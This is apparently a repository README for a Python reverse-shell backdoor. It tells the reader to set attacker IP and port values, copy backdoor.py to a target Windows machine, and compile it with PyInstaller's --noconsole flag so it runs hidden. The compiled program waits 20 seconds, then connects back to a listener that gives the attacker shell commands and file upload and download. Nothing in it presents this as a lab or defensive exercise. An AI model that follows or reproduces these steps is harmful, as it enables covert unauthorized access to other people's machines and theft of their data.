# Backdoor Using Python

## For Server.py ->
[*] Keep server.py file in your host/listening machine (Ex. Linux).
    This will act as an listener for incoming connection from the targer machine.
[*] Open server.py using any text editor. 
[*] Specify your Host Machine's IP address and Port number (ex. 5555) in the [ sock.bind(('#host ip', #port)) ] section of the code.

## For Backdoor.py ->
[*] Open the file using any text editor.
[*] Repeat the step 3 from ''Server.py'' in the [ s.connect(('#host ip',#port)) ] section of the code.
[*] Copy this file onto a target machine you want to gain access to (ex. Windows).

# Steps to perform execution!

1) In your target machine, locate to the backdoor.py file.
2) Open directory in terminal, and type the following code:
   - pyinstaller backdoor.py --onefile --noconsole
3) This will create some additional files.
4) You gotta keep the 'dist' folder and you may delete the rest

-- IN THE HOST MACHINE --
1) Locate to the server.py file
2) Open the directory in terminal, and type: python3 server.py
3) It'll wait for incoming connection from the taget machine.

-------------
1) In the target machine, open the backdoor.exe file.
2) This wont trigger anything, as it will initiate socket connection to the host machine
3) As i've added a delay of 20 seconds prior to the connection, you should be able to access the shell to the target machine in just a few seconds.
4) Yay! You've now established a reverse shell connection to the target machine

#### You can run commands like whoami, ipconfig, cd, download and upload commands
